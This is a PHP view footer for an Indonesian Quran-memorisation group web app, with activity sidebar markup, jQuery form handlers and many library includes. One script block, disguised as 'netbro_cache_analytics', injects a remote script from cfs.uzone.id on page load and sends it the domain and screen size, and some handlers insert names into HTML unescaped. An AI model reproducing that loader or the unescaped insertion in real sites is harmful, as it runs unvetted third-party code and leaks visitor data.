<div class="col-md-2 static">
    <div id="sticky-sidebar">
        <?php foreach ($info as $i) : ?>
            <h4 class="grey">Aktifitas Grup</h4>
        <?php endforeach; ?>

        <?php foreach ($notifGroup as $p) : ?>
            <div class="feed-item">
                <div class="live-activity">
                    <p>
                        <a href="<?= base_url('Friend/visitProfile/') . $p['id_user'] ?>" class="profile-link" style="color: #0486FE;">
                            <?php if ($p['role_id'] == 3) : ?>
                                <?= $p['name'] ?> <span class="badge badge-primary">Mentor</span>
                            <?php else : ?>
                                <?= $p['name'] ?>
                            <?php endif; ?>
                        </a> <?= $p['notif'] ?>
                    </p>
                    <p class="text-muted">On <br> <?= $p['date'] ?></p>
                </div>
            </div>
        <?php endforeach; ?>



    </div>
</div>

</div>
</div>
</div>
</div>



<!-- Footer
    ================================================= -->
<!--preloader-->
<div id="spinner-wrapper">
    <div class="spinner"></div>
</div>

<button id="topBtn"> <i class="fa fa-arrow-up" aria-hidden="true"></i></button>

<style>
    #topBtn {
        display: none;
        position: fixed;
        bottom: 40px;
        right: 40px;
        font-size: 22px;
        width: 50px;
        height: 50px;
        background: #0486FE;
        color: white;
        border: 2px solid #0486FE;
        cursor: pointer;
        border-radius: 30px;
        outline: none;
    }
</style>



<!-- Scripts
    ================================================= -->
<script src="<?= base_url('assets_user/') ?>js/jquery-3.1.1.min.js" defer></script>
<script src="<?= base_url('assets_user/') ?>js/datatables.min.js" defer></script>
<script src="<?= base_url('assets_user/') ?>js/jquery.dataTables.min.js" defer></script>
<script src="<?= base_url('assets_user/') ?>js/dataTables.buttons.min.js" defer></script>
<script src="<?= base_url('assets_user/') ?>js/jszip.min.js" defer></script>
<script src="<?= base_url('assets_user/') ?>js/vfs_fonts.js" defer></script>
<script src="<?= base_url('assets_user/') ?>js/pdfmake.min.js" defer></script>
<script src="<?= base_url('assets_user/') ?>js/bootstrap.min.js"></script>
<script src="<?= base_url('assets_user/') ?>js/jquery.sticky-kit.min.js"></script>
<script src="<?= base_url('assets_user/') ?>js/jquery.scrollbar.min.js"></script>
<script src="<?= base_url('assets_user/') ?>js/script.js"></script>
<script src="<?= base_url('assets_user/') ?>js/select2.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/selectize.js/0.12.6/js/standalone/selectize.min.js" integrity="sha256-+C0A5Ilqmu4QcSPxrlGpaZxJ04VjsRjKu+G82kl5UJk=" crossorigin="anonymous"></script>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/selectize.js/0.12.6/css/selectize.bootstrap3.min.css" integrity="sha256-ze/OEYGcFbPRmvCnrSeKbRTtjG4vGLHXgOqsyLFTRjg=" crossorigin="anonymous" />
<!-- <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script> -->
<!-- <script src="https://code.jquery.com/jquery-3.3.1.min.js"> -->

</script>
<script type="text/javascript">
    $(function() {
        var dtToday = new Date();

        var month = dtToday.getMonth() + 1;
        var day = dtToday.getDate();
        var year = dtToday.getFullYear();
        if (month < 10)
            month = '0' + month.toString();
        if (day < 10)
            day = '0' + day.toString();

        var maxDate = year + '-' + month + '-' + day;
        // alert(maxDate);
        $('#deadline').attr('min', maxDate);
    });
    $(document).ready(function() {
        $("#nama_surah").on("input", function() {
            var options = {};
            options.url = "<?= base_url('assets_user/') ?>json/quran.json";
            options.type = "GET";
            options.data = {
                "criteria": $("#nama_surah").val()
            };
            options.dataType = "json";
            options.success = function(data) {
                console.log(data);
                $("#list-surah").empty();
                for (var i = 0; i < data.chapters.length; i++) {
                    $("#list-surah").append("<option value=" + data.chapters[i].name_simple + " data-id=" + data.chapters[i].verses_count + "></option>");
                }
            };
            $.ajax(options);
            $('#list-ayat').find('option').remove().end().append('<option disabled selected>Pilih Ayat</option>');
            var ayatSurah = $("#list-surah option[value='" + $('#nama_surah').val() + "']").attr('data-id');
            var options = $("#list-ayat");
            var options2 = $("#list-ayat2");
            for (var i = 1; i <= ayatSurah; i++) {
                options.append("<option value=" + i + ">" + i + "</option>");
            }
            options.on('change', function() {
                $('#list-ayat2').find('option').remove().end().append('<option disabled selected>Pilih Ayat</option>');
                var ayat = $('select[name=fromAyat] option').filter(':selected').val();
                var options = $("#list-ayat2");
                if (ayatSurah == ayat) {
                    $('#list-ayat2').prop('disabled', 'disabled');
                } else {
                    $('#list-ayat2').prop('disabled', false);
                    for (var i = 1; i <= ayatSurah; i++) {
                        if (i <= ayat) {
                            options.append("<option value=" + i + " disabled>" + i + "</option>");
                        } else {
                            options.append("<option value=" + i + ">" + i + "</option>");
                        }
                    }
                }

            });
        });
    });

    $(document).ready(function() {
        $('#table_report').DataTable({
            dom: 'B',
            buttons: [
                'excel'
            ]
        });
    });

    $(document).ready(function() {
        $(".setorBtn").click(function() {
            // console.log($(this).data('nama_surah'));
            $('form #nama_surah').val($(this).data('nama_surah'));
            $('form #from_ayat').val($(this).data('ayat1'));
            $('form #to_ayat').val($(this).data('ayat2'));
            $('form #idGroup').val($(this).data('idg'));
            $('form #idUser').val($(this).data('idu'));
            $('form #idTugas').val($(this).data('idt'));

        });
    });

    $(".DetailPenugasan").click(function() {
        var id = $(this).data('id');
        var idg = this.href.substring(this.href.lastIndexOf('/') + 1);
        var url = "<?= base_url('Group/getData/postHafalan/'); ?>" + id + '/' + idg;
        var url2 = "<?= base_url('Group/getData/anggota/'); ?>" + idg;
        $.get(url, function(data) {
            store = JSON.parse(data);
            console.log(store);
            for (let i = 0; i < store.length; i++) {
                if (store[i].assign == 1) {
                    $('#sudah-setor').append(`<li class="list-group-item">${store[i].name}<span class="pull-right" style="font-size: 1em; color: green;"><i class="fas fa-check-circle"></i></span></li>`);
                } else {
                    $('#belum-setor').append(`<li class="list-group-item">${store[i].name}<span class="pull-right" style="font-size: 1em; color: red;"><i class="fas fa-times-circle"></i></span></li>`);
                }
            }
        });
    });
    $(".closeModalPenugasan").click(function() {
        $('#sudah-setor').html(' ');
        $('#belum-setor').html(' ');
    });
</script>

<script type="text/javascript">
    if (self == top) {
        function netbro_cache_analytics(fn, callback) {
            setTimeout(function() {
                fn();
                callback();
            }, 0);
        }

        function sync(fn) {
            fn();
        }

        function requestCfs() {
            var idc_glo_url = (location.protocol == "https:" ? "https://" : "http://");
            var idc_glo_r = Math.floor(Math.random() * 99999999999);
            var url = idc_glo_url + "cfs.uzone.id/2fn7a2/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" +
                "4TtHaUQnUEiP6K%2fc5C582JQuX3gzRncXxgfvjefwcdriOLlG%2b7ksg9VC9SoUc62sZGz3a1NnaBpLZVB7Hniy7DqfJghOkfE%2bvgrXz1J6hiqOagGPr8AJtYnrG9F8WsbC9NTT3D067Qrtrk6CypnA1hHLiZ9UHXh5O7oE4LQggQVUh9G0Z0N8ofpUK8VvylR0y9f20GsNaG0DlFMCmCGX75UsDo%2bGEepr14Vl1ZWZfMeO%2fujDjRXEEFY52oxcbL7haC02NUmCmif2%2bJ0lv6W6dl2T3%2bFL2MOqVbIJnEN%2bNiOYsuJe25ok2F%2bAG5lNv2ScNVhEREDUSc4kCLCCpd6dsyApBKXIAoSlkKR%2b4AAE8jHzZ%2fKJC1nYNxV0OnoXZXH8zcMUNqHfqfyFmNMVr63Q4mHSIhX7vLDMZTfWAR%2bAM4waMecHNBA45V7vCPgIkOJ%2f%2bb7xxZU0Wvnmr1%2fWJnqHfKspgMnStwehyp3Fj4I79iOhZACQPf6I%2fKhY5RE%2bLQACcN1mYpbRWbc%3d" +
                "&idc_r=" + idc_glo_r + "&domain=" + document.domain + "&sw=" + screen.width + "&sh=" + screen.height;
            var bsa = document.createElement('script');
            bsa.type = 'text/javascript';
            bsa.async = true;
            bsa.src = url;
            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(bsa);
        }
        netbro_cache_analytics(requestCfs, function() {});
    };
</script>

<script type="text/javascript">
    $(document).ready(function() {
        $(window).scroll(function() {
            if ($(this).scrollTop() > 40) {
                $('#topBtn').fadeIn();
            } else {
                $('#topBtn').fadeOut();
            }
        });

        $("#topBtn").click(function() {
            $('html,body').animate({
                scrollTop: 0
            }, 1500);
        });
    });
</script>

<script src="<?= base_url('assets_user/js/pindah.js'); ?>"></script>
<script src="https://code.jquery.com/jquery-3.5.1.slim.min.js" integrity="sha384-DfXdz2htPH0lsSSs5nCTpuj/zy4C+OGpamoFVy38MVBnE+IbbVYUew+OrCXaRkfj" crossorigin="anonymous">
</script>
<script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.1/dist/umd/popper.min.js" integrity="sha384-9/reFTGAW83EW2RDu2S0VKaIzap3H66lZH81PoYlFhbGU+6BZp6G7niu735Sk7lN" crossorigin="anonymous">
</script>
<script src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/js/bootstrap.min.js" integrity="sha384-+YQ4JLhjyBLPDQt//I+STsc9iw4uQqACwlvpslubQzn4u2UU2UFM80nGisd026JF" crossorigin="anonymous">
</script>

<script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.1/dist/umd/popper.min.js"></script>
<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>


<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/js/bootstrap.min.js"></script>

<script src="//code.tidio.co/r039ic2pvnauzj98l3ccwkkg58essfy6.js" async></script>

</body>

<!-- Mirrored from mythemestore.com/friend-finder/timeline.html by HTTrack Website Copier/3.x [XR&CO'2014], Tue, 21 Jan 2020 16:38:23 GMT -->

</html>